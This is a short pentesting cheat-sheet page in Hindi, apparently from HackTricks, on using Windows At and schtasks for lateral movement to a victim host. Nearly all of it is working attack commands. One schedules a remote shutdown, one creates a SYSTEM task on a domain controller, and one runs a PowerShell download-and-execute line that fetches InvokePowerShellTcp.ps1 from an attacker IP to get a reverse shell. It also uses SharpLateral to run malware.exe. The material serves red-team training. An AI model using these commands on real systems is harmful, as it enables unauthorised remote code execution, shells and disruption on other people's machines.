# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## यह कैसे काम करता है

At आपको उन होस्ट में कार्य निर्धारित करने की अनुमति देता है जहाँ आप उपयोगकर्ता नाम/(पासवर्ड/हैश) जानते हैं। इसलिए, आप इसका उपयोग अन्य होस्ट में कमांड निष्पादित करने और आउटपुट प्राप्त करने के लिए कर सकते हैं।
```
At \\victim 11:00:00PM shutdown -r
```
schtasks का उपयोग करते हुए, आपको पहले कार्य बनाना होगा और फिर उसे कॉल करना होगा:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
आप [SharpLateral](https://github.com/mertdas/SharpLateral) का भी उपयोग कर सकते हैं:
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
[**schtasks के साथ सिल्वर टिकट के उपयोग के बारे में अधिक जानकारी यहाँ**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
